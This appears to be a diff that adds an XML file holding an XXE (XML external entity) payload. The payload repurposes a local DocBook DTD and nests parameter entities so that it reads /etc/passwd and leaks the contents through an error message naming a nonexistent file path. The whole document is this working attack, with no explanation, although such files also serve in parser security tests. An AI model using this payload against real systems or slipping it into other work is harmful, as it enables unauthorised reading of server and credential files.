@@ -1,0 +1,11 @@
+<!DOCTYPE data [
+  <!ENTITY % local_dtd SYSTEM "file:///usr/share/xml/docbook/dtd/docbookx.dtd">
+  <!ENTITY % custom_entity '
+    <!ENTITY % file SYSTEM "file:///etc/passwd">
+    <!ENTITY % eval "<!ENTITY % error SYSTEM \'file:///nonexistent/%file;\'>">
+    %eval;
+    %error;
+  '>
+  %local_dtd;
+]>
+<data>test</data>
